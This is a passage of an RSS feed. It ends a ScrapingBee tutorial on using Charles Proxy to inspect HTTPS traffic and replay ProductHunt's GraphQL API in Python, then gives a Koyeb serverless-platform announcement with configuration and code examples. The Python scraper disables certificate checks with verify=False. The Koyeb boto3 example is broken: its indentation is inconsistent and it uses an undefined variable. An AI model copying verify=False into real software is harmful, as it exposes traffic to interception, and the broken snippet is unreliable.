    " data-src="https://d33wubrfki0l68.cloudfront.net/7557901e88720e280d75eb07f7881f37df6a17cc/a65ba/blog/charles-proxy/root-certificate.png">
  
</p></div>




<p>After clicking on Install Root Certificate, it will open your macOS Keychain Access, and you will have to open the Trust menu and click on “Always trust”.</p>
<p>This will ask you for your system password.</p>
<p>Now you will need to go to Proxy &gt; SSL Proxying Settings and add “*” or the domain you want to inspect SSL on.</p>






















<div>
  
  <p><img loading="lazy" srcset="
      
      
      " src="https://d33wubrfki0l68.cloudfront.net/9a166609eee9057a6b518e983faf3a7939961f14/da076/blog/charles-proxy/ssl-settings.png" width="704" height="577" alt="SSL Proxying settings" data-src="https://d33wubrfki0l68.cloudfront.net/9a166609eee9057a6b518e983faf3a7939961f14/da076/blog/charles-proxy/ssl-settings.png">
  
</p></div>




<p>Charles will now capture the HTTPS traffic on the domain you've selected.</p>
<h2 id="finding-hidden-apis-on-single-page-applications">Finding hidden APIs on Single Page Applications</h2>
<p>In a traditional <em><strong>server-side</strong></em> rendered website, the HTML code is built by the backend service, and the full page is returned to the HTTP client (generally your browser).
Over the past 10 years, more and more websites are rendered <em><strong>client-side</strong></em> using a Single Page Application framework like React.js, Vue.js or Angular.</p>
<p>Those framework are sending many requests to a back-end API, and it can be a great idea to consume those APIs directly instead of scraping the site and rendering the Javascript with a headless browser to extract the data you want. It will be much faster, you don't need expensive hardware (headless browser needs a lot of RAM and powerful CPUs.).</p>
<p>We are going to look at different Single Page Application to see how Charles proxy can help you discover and extract data from back-end APIs.</p>
<p>Let's start with <a href="https://www.producthunt.com/">ProductHunt</a></p>
<p>ProductHunt is a famous website to launch products online. It's very popular in the tech ecosystem. There are dozens of projects launched every day, so the front page only loads the products of the day. There is an infinite scroll to look at previous days products.</p>
<p>We are going to use Charles proxy to analyze the backend API call and reproduce it with some Python code.</p>
<p>Now open Charles proxy and go to the Producthunt home page, scroll several times to the bottom of the page.</p>
<p>By default, Charles will capture every HTTP request made by your system, not only your browser. So you will get a lot of “pollution”. You can filter that by entering the domain you're interested in:</p>






















<div>
  
  <p><img loading="lazy" srcset="
      
        , https://d33wubrfki0l68.cloudfront.net/47931b5b58ae2245ff98bc98032f3404bb28a56f/b85f4/blog/charles-proxy/charles_filter_huea464f70727612c3c89c18a2a64372ba_104579_825x0_resize_catmullrom_2.png 825w
      
      
        , https://d33wubrfki0l68.cloudfront.net/9ecae3d05e809709f0d039ce8c19ca8025b11387/4bb81/blog/charles-proxy/charles_filter_huea464f70727612c3c89c18a2a64372ba_104579_1200x0_resize_catmullrom_2.png 1200w
      
      
        , https://d33wubrfki0l68.cloudfront.net/71bf530cdcf033637dba926220fa528d526df002/2f072/blog/charles-proxy/charles_filter_huea464f70727612c3c89c18a2a64372ba_104579_1500x0_resize_catmullrom_2.png 1500w 
      " src="https://d33wubrfki0l68.cloudfront.net/272a70f0775e173e0cabfc5a72690fcdc5e139e9/9eb41/blog/charles-proxy/charles_filter.png" width="1905" height="460" alt="Filter by domain in Charles" data-srcset="
    
      , https://d33wubrfki0l68.cloudfront.net/47931b5b58ae2245ff98bc98032f3404bb28a56f/b85f4/blog/charles-proxy/charles_filter_huea464f70727612c3c89c18a2a64372ba_104579_825x0_resize_catmullrom_2.png 825w
    
    
      , https://d33wubrfki0l68.cloudfront.net/9ecae3d05e809709f0d039ce8c19ca8025b11387/4bb81/blog/charles-proxy/charles_filter_huea464f70727612c3c89c18a2a64372ba_104579_1200x0_resize_catmullrom_2.png 1200w
    
    
      , https://d33wubrfki0l68.cloudfront.net/71bf530cdcf033637dba926220fa528d526df002/2f072/blog/charles-proxy/charles_filter_huea464f70727612c3c89c18a2a64372ba_104579_1500x0_resize_catmullrom_2.png 1500w 
    " data-src="https://d33wubrfki0l68.cloudfront.net/272a70f0775e173e0cabfc5a72690fcdc5e139e9/9eb41/blog/charles-proxy/charles_filter.png">
  
</p></div>




<p>If you click on one of the POST requests to the <code>/frontend/graphql</code> endpoint, you can inspect both the request and the response.</p>






















<div>
  
  <p><img loading="lazy" srcset="
      
        , https://d33wubrfki0l68.cloudfront.net/4e8a478174ef6a8e4bd7c4e8fec851e3595e7fa6/f4a8e/blog/charles-proxy/product_hunt_graphql1_hu3869c22f83f3b8a2b9a4675617d88b62_194867_825x0_resize_catmullrom_2.png 825w
      
      
        , https://d33wubrfki0l68.cloudfront.net/b956a33798961031c094f73e32ffe24e9cc55e02/44032/blog/charles-proxy/product_hunt_graphql1_hu3869c22f83f3b8a2b9a4675617d88b62_194867_1200x0_resize_catmullrom_2.png 1200w
      
      
        , https://d33wubrfki0l68.cloudfront.net/4db37d8e9dd976d341f07356c9d716219122b94e/4436d/blog/charles-proxy/product_hunt_graphql1_hu3869c22f83f3b8a2b9a4675617d88b62_194867_1500x0_resize_catmullrom_2.png 1500w 
      " src="https://d33wubrfki0l68.cloudfront.net/939c0b04b7b3d8613354fb3d3f89f0d19d20325b/451c1/blog/charles-proxy/product_hunt_graphql1.png" width="1904" height="960" alt="Sequence of request in Charles proxy, from ProductHunt home page" data-srcset="
    
      , https://d33wubrfki0l68.cloudfront.net/4e8a478174ef6a8e4bd7c4e8fec851e3595e7fa6/f4a8e/blog/charles-proxy/product_hunt_graphql1_hu3869c22f83f3b8a2b9a4675617d88b62_194867_825x0_resize_catmullrom_2.png 825w
    
    
      , https://d33wubrfki0l68.cloudfront.net/b956a33798961031c094f73e32ffe24e9cc55e02/44032/blog/charles-proxy/product_hunt_graphql1_hu3869c22f83f3b8a2b9a4675617d88b62_194867_1200x0_resize_catmullrom_2.png 1200w
    
    
      , https://d33wubrfki0l68.cloudfront.net/4db37d8e9dd976d341f07356c9d716219122b94e/4436d/blog/charles-proxy/product_hunt_graphql1_hu3869c22f83f3b8a2b9a4675617d88b62_194867_1500x0_resize_catmullrom_2.png 1500w 
    " data-src="https://d33wubrfki0l68.cloudfront.net/939c0b04b7b3d8613354fb3d3f89f0d19d20325b/451c1/blog/charles-proxy/product_hunt_graphql1.png">
  
</p></div>




<p>There are many things going on with these requests, but if you compare the content being sent to the GraphQL API, it seems the only thing that changes is the <code>cursor</code> parameter.</p>
<p>It is base64 encoded, but luckily, Charles has a feature to quickly decode Base64 content. You just have to select it and right-click:</p>






















<div>
  
  <p><img loading="lazy" srcset="
      
      
      " src="https://d33wubrfki0l68.cloudfront.net/b6734761222929a603852e3310a4248ce09d7ece/f5dc1/blog/charles-proxy/base64decode.png" width="433" height="470" alt="Sequence of request in Charles proxy, from ProductHunt home page" data-src="https://d33wubrfki0l68.cloudfront.net/b6734761222929a603852e3310a4248ce09d7ece/f5dc1/blog/charles-proxy/base64decode.png">
  
</p></div>




<p>One of the killer features Charles offers is the ability to edit any request and replay. In our case it's really great because there are many headers/cookies values inside the request, so it would be a nightmare to try to reproduce the request with an HTTP client or inside your code.</p>
<p>In order to do that, you can right-click on the request and click on Compose.</p>






















<div>
  
  <p><img loading="lazy" srcset="
      
        , https://d33wubrfki0l68.cloudfront.net/fa48d399f93a2ffdf8ff79613acb85956789ce76/2beba/blog/charles-proxy/compose_charles_hubc4f61e8969f6a1e56de0390583567a6_43272_825x0_resize_catmullrom_2.png 825w
      
      
      " src="https://d33wubrfki0l68.cloudfront.net/f6e5d702cb0531ba1719c9cc807ad4dc73282717/580da/blog/charles-proxy/compose_charles.png" width="1094" height="521" alt="Compose request Charles proxy" data-srcset="
    
      , https://d33wubrfki0l68.cloudfront.net/fa48d399f93a2ffdf8ff79613acb85956789ce76/2beba/blog/charles-proxy/compose_charles_hubc4f61e8969f6a1e56de0390583567a6_43272_825x0_resize_catmullrom_2.png 825w
    
    
    " data-src="https://d33wubrfki0l68.cloudfront.net/f6e5d702cb0531ba1719c9cc807ad4dc73282717/580da/blog/charles-proxy/compose_charles.png">
  
</p></div>




<p>You can then play with the <code>cursor</code> value and replace it with a different page number encoded in base64. Then click on Execute.</p>
<p>You can also try deleting the different cookies (it will work). It's great news because if cookies were mandatory to use this endpoint, it would have been more complicated to reproduce the request with our Python code.</p>
<p>Now you can export the request to cURL:</p>






















<div>
  
  <p><img loading="lazy" srcset="
      
      
      " src="https://d33wubrfki0l68.cloudfront.net/d4650e428f9936b26cd8a6cff8e4fc9a50af9f72/76968/blog/charles-proxy/export_curl.png" width="665" height="496" alt="Compose request Charles proxy" data-src="https://d33wubrfki0l68.cloudfront.net/d4650e428f9936b26cd8a6cff8e4fc9a50af9f72/76968/blog/charles-proxy/export_curl.png">
  
</p></div>




<p>Then you can use a tool like this one to convert the cURL command to Python code (using the wonderful Requests package): <a href="https://curl.trillworks.com/"></a><a href="https://curl.trillworks.com/">https://curl.trillworks.com/</a></p>
<p>I just added the <code>verify=False</code> parameter to avoid SSL warnings with Requests.</p>
<div><pre><code data-lang="python"><span>import</span> requests


headers <span>=</span> {
    <span></span><span>'</span><span>Host</span><span>'</span>: <span></span><span>'</span><span>www.producthunt.com</span><span>'</span>,
    <span></span><span>'</span><span>accept</span><span>'</span>: <span></span><span>'</span><span>*/*</span><span>'</span>,
    <span></span><span>'</span><span>x-requested-with</span><span>'</span>: <span></span><span>'</span><span>XMLHttpRequest</span><span>'</span>,
    <span></span><span>'</span><span>user-agent</span><span>'</span>: <span></span><span>'</span><span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36</span><span>'</span>,
    <span></span><span>'</span><span>content-type</span><span>'</span>: <span></span><span>'</span><span>application/json</span><span>'</span>,
    <span></span><span>'</span><span>origin</span><span>'</span>: <span></span><span>'</span><span>https://www.producthunt.com</span><span>'</span>,
    <span></span><span>'</span><span>sec-fetch-site</span><span>'</span>: <span></span><span>'</span><span>same-origin</span><span>'</span>,
    <span></span><span>'</span><span>sec-fetch-mode</span><span>'</span>: <span></span><span>'</span><span>cors</span><span>'</span>,
    <span></span><span>'</span><span>sec-fetch-dest</span><span>'</span>: <span></span><span>'</span><span>empty</span><span>'</span>,
    <span></span><span>'</span><span>referer</span><span>'</span>: <span></span><span>'</span><span>https://www.producthunt.com/</span><span>'</span>,
    <span></span><span>'</span><span>accept-language</span><span>'</span>: <span></span><span>'</span><span>en-US,en;q=0.9</span><span>'</span>,
}

data <span>=</span> <span></span><span>'</span><span>{</span><span>"</span><span>operationName</span><span>"</span><span>:</span><span>"</span><span>HomePage</span><span>"</span><span>,</span><span>"</span><span>variables</span><span>"</span><span>:{</span><span>"</span><span>cursor</span><span>"</span><span>:</span><span>"</span><span>OA==</span><span>"</span><span>,</span><span>"</span><span>featured</span><span>"</span><span>:true,</span><span>"</span><span>includePromotedPost</span><span>"</span><span>:false,</span><span>"</span><span>visibleOnHomepage</span><span>"</span><span>:true,</span><span>"</span><span>includeLayout</span><span>"</span><span>:false},</span><span>"</span><span>query</span><span>"</span><span>:</span><span>"</span><span>query HomePage($cursor: String, $postCursor: String, $featured: Boolean!, $includePromotedPost: Boolean!, $visibleOnHomepage: Boolean!) {</span><span>\\</span><span>n sections(first: 1, after: $cursor, featured: $featured) {</span><span>\\</span><span>n edges {</span><span>\\</span><span>n cursor</span><span>\\</span><span>n node {</span><span>\\</span><span>n id</span><span>\\</span><span>n date</span><span>\\</span><span>n cutoff_index</span><span>\\</span><span>n posts_count</span><span>\\</span><span>n cards(first: 1, after: $cursor) {</span><span>\\</span><span>n edges {</span><span>\\</span><span>n node {</span><span>\\</span><span>n ...FeedCards</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n posts(after: $postCursor, visible_on_homepage: $visibleOnHomepage) {</span><span>\\</span><span>n edges {</span><span>\\</span><span>n node {</span><span>\\</span><span>n ...PostItemList</span><span>\\</span><span>n featured_comment {</span><span>\\</span><span>n id</span><span>\\</span><span>n body: body_text</span><span>\\</span><span>n user {</span><span>\\</span><span>n id</span><span>\\</span><span>n ...UserImageLink</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n pageInfo {</span><span>\\</span><span>n endCursor</span><span>\\</span><span>n hasNextPage</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n pageInfo {</span><span>\\</span><span>n endCursor</span><span>\\</span><span>n hasNextPage</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n ad(kind: </span><span>\\</span><span>"</span><span>feed</span><span>\\</span><span>"</span><span>) @include(if: $includePromotedPost) {</span><span>\\</span><span>n ...AdFragment</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n promoted_email_campaign(promoted_type: HOMEPAGE) @include(if: $includePromotedPost) {</span><span>\\</span><span>n id</span><span>\\</span><span>n abTestName</span><span>\\</span><span>n abVariant {</span><span>\\</span><span>n id</span><span>\\</span><span>n ...PromotedEmailAbTestVariantFragment</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n ...PromotedEmailCampaignFragment</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n daily_newsletter {</span><span>\\</span><span>n id</span><span>\\</span><span>n subject</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n viewer {</span><span>\\</span><span>n id</span><span>\\</span><span>n email</span><span>\\</span><span>n has_newsletter_subscription</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n ph_homepage_og_image_url</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment FeedCards on Card {</span><span>\\</span><span>n ...NewPostsCard</span><span>\\</span><span>n ...BestProductsFromLastWeekCard</span><span>\\</span><span>n ...MakersDiscussionCardFragment</span><span>\\</span><span>n ...GoldenKittyCardFragment</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment NewPostsCard on NewPostsCard {</span><span>\\</span><span>n is_dismissed</span><span>\\</span><span>n kind</span><span>\\</span><span>n posts {</span><span>\\</span><span>n ...PostItemList</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment PostItemList on Post {</span><span>\\</span><span>n id</span><span>\\</span><span>n ...PostItem</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment PostItem on Post {</span><span>\\</span><span>n id</span><span>\\</span><span>n _id</span><span>\\</span><span>n comments_count</span><span>\\</span><span>n name</span><span>\\</span><span>n shortened_url</span><span>\\</span><span>n slug</span><span>\\</span><span>n tagline</span><span>\\</span><span>n updated_at</span><span>\\</span><span>n topics {</span><span>\\</span><span>n edges {</span><span>\\</span><span>n node {</span><span>\\</span><span>n id</span><span>\\</span><span>n name</span><span>\\</span><span>n slug</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n ...PostThumbnail</span><span>\\</span><span>n ...PostVoteButton</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment PostThumbnail on Post {</span><span>\\</span><span>n id</span><span>\\</span><span>n name</span><span>\\</span><span>n thumbnail {</span><span>\\</span><span>n id</span><span>\\</span><span>n media_type</span><span>\\</span><span>n ...MediaThumbnail</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n ...PostStatusIcons</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment MediaThumbnail on Media {</span><span>\\</span><span>n id</span><span>\\</span><span>n image_uuid</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment PostStatusIcons on Post {</span><span>\\</span><span>n name</span><span>\\</span><span>n product_state</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment PostVoteButton on Post {</span><span>\\</span><span>n _id</span><span>\\</span><span>n id</span><span>\\</span><span>n featured_at</span><span>\\</span><span>n updated_at</span><span>\\</span><span>n created_at</span><span>\\</span><span>n disabled_when_scheduled</span><span>\\</span><span>n has_voted</span><span>\\</span><span>n ... on Votable {</span><span>\\</span><span>n id</span><span>\\</span><span>n votes_count</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment BestProductsFromLastWeekCard on BestProductsFromLastWeekCard {</span><span>\\</span><span>n posts {</span><span>\\</span><span>n ...PostItemList</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment MakersDiscussionCardFragment on MakersDiscussionCard {</span><span>\\</span><span>n isDismissed</span><span>\\</span><span>n discussion {</span><span>\\</span><span>n _id</span><span>\\</span><span>n id</span><span>\\</span><span>n ...DiscussionThreadListItem</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment DiscussionThreadListItem on DiscussionThread {</span><span>\\</span><span>n _id</span><span>\\</span><span>n id</span><span>\\</span><span>n title</span><span>\\</span><span>n description</span><span>\\</span><span>n descriptionHtml</span><span>\\</span><span>n slug</span><span>\\</span><span>n commentsCount</span><span>\\</span><span>n can_comment: canComment</span><span>\\</span><span>n discussionPath</span><span>\\</span><span>n canEdit</span><span>\\</span><span>n votesCount</span><span>\\</span><span>n hasVoted</span><span>\\</span><span>n createdAt</span><span>\\</span><span>n poll {</span><span>\\</span><span>n ...PollFragment</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n user {</span><span>\\</span><span>n id</span><span>\\</span><span>n name</span><span>\\</span><span>n username</span><span>\\</span><span>n headline</span><span>\\</span><span>n avatar</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment PollFragment on Poll {</span><span>\\</span><span>n id</span><span>\\</span><span>n answersCount</span><span>\\</span><span>n hasAnswered</span><span>\\</span><span>n options {</span><span>\\</span><span>n id</span><span>\\</span><span>n text</span><span>\\</span><span>n imageUuid</span><span>\\</span><span>n answersCount</span><span>\\</span><span>n answersPercent</span><span>\\</span><span>n hasAnswered</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment GoldenKittyCardFragment on GoldenKittyCard {</span><span>\\</span><span>n is_dismissed</span><span>\\</span><span>n category_for_voting {</span><span>\\</span><span>n id</span><span>\\</span><span>n slug</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n …</span></code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.scrapingbee.com/blog/charles-proxy/">https://www.scrapingbee.com/blog/charles-proxy/</a></em></p>]]>
            </description>
            <link>https://www.scrapingbee.com/blog/charles-proxy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25070934</guid>
            <pubDate>Thu, 12 Nov 2020 15:34:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Koyeb Serverless Engine: Docker Containers, Continuous Deployment of Functions]]>
            </title>
            <description>
<![CDATA[
Score 49 | Comments 10 (<a href="https://news.ycombinator.com/item?id=25070416">thread link</a>) | @edouardb
<br/>
November 12, 2020 | http://koyeb.com/blog/announcing-the-koyeb-serverless-engine-docker-containers-and-continuous-deployment-of-functions | <a href="https://web.archive.org/web/*/http://koyeb.com/blog/announcing-the-koyeb-serverless-engine-docker-containers-and-continuous-deployment-of-functions">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>In July, we announced the early access of the Koyeb platform to help developers and businesses run serverless data-processing apps in minutes. Since then, we have received a lot of feedback and have been at work improving the product.</p><p>Today, we are proud to announce the public availability of the <strong>Koyeb Serverless Engine</strong> with our latest features to <strong>deploy your own code</strong>. In addition to the ready-to-use integrations, you can now seamlessly deploy <strong><a href="#native-support-of-docker-containers">Docker Containers</a></strong> and <strong><a href="#continuous-deployment-of-python-and-nodejs-functions-using-git">Code Functions with built-in Continuous Deployment using Git</a>.</strong></p><p>This release brings the power of the Koyeb Serverless Engine to all developers and businesses with <strong><a href="#event-driven-processing">event-driven processing</a>, <a href="#serverless-autoscaling-and-high-availability">native autoscaling</a>,</strong> and <strong>a complete secret management engine.</strong> The Koyeb platform provides strong primitives for data-processing with our <strong><a href="#object-storage-api-and-data-processing">Universal S3-Compliant Object Storage API</a></strong> and <strong>ready-to-use integrations</strong>. We're also happy to share that <strong><a href="#new-open-source-catalog">our catalog is now open-source</a></strong>.</p><p>The Koyeb platform offers an efficient solution to deploy your serverless applications. It is the best platform to <strong>deploy short and long-running background processing tasks with no time limit for the execution of your jobs</strong>. Common use-cases are:</p><ul><li><em>Media processing</em>: transforming images, videos, audio recordings or PDFs directly at upload</li><li><em>Web scraping and headless browser requests</em>: fetching data from and interacting with websites which do not have any API</li><li><em>Interfacing with slow or asynchronous APIs</em>: calling slow APIs or APIs using callbacks</li><li><em>Asynchronous Computer Vision and Inference</em>: automatic content detection in photos and videos for indexing, metadata enrichment or advanced anlysis</li><li><em>Batch processing</em>: running heavy computations on batches of database records or media</li><li><em>Data science and report generation</em>: analysing data and generating pre-computed reports</li><li><em>Notification reception and processing from IoT devices</em>: reacting to events generated by devices and triggering actions</li><li><em>DevOps</em>: backup, monitoring, build and deployment jobs</li><li>And much more!</li></ul><p><strong>We're happy to provide 1000 hours of compute, 1TB of storage, and 5TB of bandwidth per month for free until the end of the year.</strong>  All the function executions are currently powered by <strong>1GB of RAM and 1 vCPU</strong>. <a target="_blank" rel="noopener" href="https://app.koyeb.com/auth/signup"><strong>Sign up now</strong></a> and start deploying serverless functions!</p><p>One of the recurring requests we got was the ability to <strong>deploy your own code on Koyeb</strong>. We get it: you need to be able to inject your business logic and pair it with our ready-to-use integrations to build your application faster and better.</p><p>When looking for an efficient way to let you manage your stack functions and modifications, we decided to go with the best-practice for code and infrastructure management: <strong>version everything</strong>. We're glad to share that this new release brings a <strong>native integration with git and GitHub</strong> to seamlessly integrate Koyeb with your development workflows.</p><p>Integrating Koyeb in your development environment is a two-step process:</p><ol start="1"><li>Add a <span><code><span>koyeb.yaml</span></code></span> file in your repository describing your stack configuration. Stacks can now be deployed with a simple YAML syntax which should look familiar.
For instance, to deploy a Python 3.8 function with the <span><code><span>handler</span></code></span> entrypoint in the <span><code><span>hello_world</span></code></span> package, your <span><code><span>koyeb.yaml</span></code></span> will look like:</li></ol><pre><code><span>1</span><span>functions:
</span><span>2</span>  - name: hello-world
<span>3</span>    runtime: python3.8
<span>4</span>    handler: hello_world.handler
</code></pre><p>Fork our <a target="_blank" rel="noopener" href="https://github.com/koyeb-community/hello-world-python">Hello World in Python on GitHub</a> to see a simple example in action. You can deploy Python and Node.js functions with the same syntax.</p><ol start="2"><li>Connect your GitHub repository to Koyeb.</li></ol><p>Now each time you <span><code><span>git push</span></code></span>, we will build and deploy your code!</p><p>For Python and Node.js functions, we take care of the complete build process using standard dependency management tools. If you want to read more about deploying code functions, check our <a target="_blank" rel="noopener" href="http://koyeb.com/docs/stacks/quickstart/deploy-python-function">Python function</a> and <a target="_blank" rel="noopener" href="http://koyeb.com/docs/stacks/quickstart/deploy-nodejs-function">Node.js function</a> documentation.</p><p>After looking into the serverless space, we found that serverless solutions were fragmented into two separate generations of products to solve the same problem: containers and code functions. Our research shows that a lot of developers and companies try to use code functions but end up migrating to a container service due to runtime limitations.</p><p>We want you to be able to process your data with the technology you know and love, so we decided to provide <strong>a unified solution to deploy your applications</strong>.</p><p><strong>Containers can be deployed with the same simple YAML syntax as functions.</strong>
For instance, to deploy the <span><code><span>koyeb/cowsay</span></code></span> container from the Docker Hub, you simply need three lines of configuration:</p><pre><code><span>1</span><span>functions:
</span><span>2</span>  - name: hello-koyeb
<span>3</span>    image: koyeb/cowsay
</code></pre><p>The Koyeb Stacks work in a unified way for containers and code functions. The deployment of containers also integrates with git and lets you benefit from native versioning.</p><p>The Koyeb Serverless Engine is completely event-driven, allowing seamless integration with various sources and native autoscaling. The platform not only provides strong integration with events coming from our Object Storage gateway, it also lets you invoke your functions using events respecting the <a target="_blank" rel="noopener" href="https://cloudevents.io/">CloudEvent specification</a>.</p><p>The event system is designed to be powerful with <strong>easy filtering of incoming events using the Common Expression Language</strong>. Here is a simple example, triggering a container dumping the incoming event with <span><code><span>jq</span></code></span> each time an event is received on the Koyeb Object Storage gateway:</p><pre><code><span>1</span><span>functions:
</span><span>2</span>  - name: display-koyeb-event
<span>3</span>    image: stedolan/jq
<span>4</span>    args: [".", "/koyeb/events/in/raw"]
<span>5</span>    events:
<span>6</span>      - cloudevent:
<span>7</span>          expression: event.source == "koyeb.com/gateway"
</code></pre><p>One of the most challenging parts of serverless technologies is troubleshooting. We decided to provide <strong>essential observability features and event tracing as part of the core platform</strong>. All stacks have an audit log with all the events received and which function they triggered. The event content is highly accessible, so you can easily understand your functions' executions and failures.</p><p>As events are the foundation of our connected world, we're exploring use-cases in the IoT space. If you want to talk about events or IoT, please <a target="_blank" rel="noopener" href="http://koyeb.com/contact">contact us</a>!</p><p><a target="_blank" rel="noopener" href="https://www.koyeb.com/docs/stacks/quickstart/bind-store-events">Read more about events in our documentation</a>.</p><p>As part of the Koyeb Platform, we provide an S3-Compliant Object Storage API to store your data. You can use a Koyeb Managed Store or connect your own account cloud service provider. We're happy to share that we already support major cloud service providers including <strong>GCP Storage and AWS S3</strong>.</p><p>We also have an impressive list of cloud service providers in preview: <strong>Azure Blob, Wasabi Storage, Backblaze B2, DigitalOcean Spaces, StackPath Object Storage, and Scaleway Object Storage</strong>.</p><p><strong>Our Serverless Compute Engine is designed to seamlessly integrate with our Object Storage API</strong>. You can easily interact with your Stores from your Koyeb Stack functions and access your data with no effort.</p><p>When you do so, each function execution will get <strong>short-lived credentials</strong> in the environment to access your data store and <strong>prevent credentials leakage</strong>.</p><p>Here is an example of a function using the stores with our secret management engine to fetch the content of an object. The object to fetch and bucket location are automatically provided in the incoming event:</p><pre><code><span>1</span><span>import boto3
</span><span>2</span>import os
<span>3</span>
<span>4</span>def handler(event, context):
<span>5</span>        obj_name = event["object"]["key"]
<span>6</span>        store_name = event["bucket"]["name"]
<span>7</span>        boto_session = boto3.Session(region_name=os.environ[f"KOYEB_STORE_{store_name}_REGION"])
<span>8</span>    store_client = boto_session.resource(
<span>9</span>        "s3",
<span>10</span>        aws_access_key_id=os.environ[f"KOYEB_STORE_{store_name}_ACCESS_KEY"],
<span>11</span>        aws_secret_access_key=os.environ[f"KOYEB_STORE_{store_name}_SECRET_KEY"],
<span>12</span>        endpoint_url=os.environ[f"KOYEB_STORE_{store_name}_ENDPOINT"],
<span>13</span>    )
<span>14</span>    obj = store_client.Object(obj_key).get()
<span>15</span>    content = obj["Body"].read()
<span>16</span>    # Add your own processing logic!
</code></pre><p>Our S3-Compliant object storage API can now also be used as a <strong>standalone solution to benefit from a unified API wherever your data is stored</strong>.</p><p>One of the core benefits of the Koyeb serverless engine is that <strong>autoscaling and high-availability are provided by design</strong>.</p><p>On the availability side, you don't need to worry about dealing with failures of the underlying infrastructure, we take care of <strong>automatically provisioning your functions on a new server in case of a failure</strong>.</p><p>On the scaling side, we <strong>automatically increase the number of containers according to the number of incoming events</strong>. Free accounts have a default scaling limit at 10 to prevent abuse, <a target="_blank" rel="noopener" href="https://app.koyeb.com/support">contact us</a> if you need to scale more!</p><p>Our function catalog has been completely refreshed with <strong>ready-to-use integrations which are now completely open-source</strong>: <a target="_blank" rel="noopener" href="http://github.com/koyeb-community">github.com/koyeb-community</a>.</p><p>It's easy to combine ready-to-use functions with your own code in Stacks. For instance, to to use the <a target="_blank" rel="noopener" href="http://koyeb.com/catalog/function/image-resize">image-resize function from the catalog</a>, simply add to your <span><code><span>koyeb.yaml</span></code></span>:</p><pre><code><span>1</span><span>functions:
</span><span>2</span>  - name: image-resize
<span>3</span>    use: image-resize@1.0.0
<span>4</span>    with:
<span>5</span>      STORE: your-store
<span>6</span>      IMAGE_RESIZE_WIDTH: 150
